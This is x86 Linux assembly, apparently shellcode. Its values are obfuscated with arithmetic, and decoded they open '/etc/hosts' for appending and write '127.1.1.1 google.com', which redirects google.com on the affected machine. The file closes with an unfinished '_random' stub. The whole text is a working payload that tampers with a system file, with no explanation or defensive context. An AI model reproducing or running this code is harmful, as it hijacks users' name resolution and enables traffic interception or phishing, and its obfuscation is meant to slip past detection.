global _start

section .text

_start:
    push byte 0x4
    pop eax
    inc eax
    sub edx, edx
    push edx
    mov ecx, 0x88998899
    sub ecx, 0x1525152A
    push ecx
    sub ecx, 0x0B454440
    push ecx
    sub ecx, 0x04BACA01
    inc ecx
    push ecx
    sub ecx, 0x6374612E
    mov ebx, esp
    int 0x80
    xchg eax, ebx
    jmp short _load_data

_write:
    pop eax
    xchg eax, ecx
    push byte 0x3
    pop esi
    mov eax, esi
    inc eax
    push len
    pop edx
    int 0x80
    inc esi
    inc esi
    inc esi
    xchg eax, esi
    int 0x80
    inc eax
    int 0x80

_load_data:
    call _write
    google: db "127.1.1.1 google.com"
    len: equ $-google

_random:
    cld
    xor esi,esi
    cld
    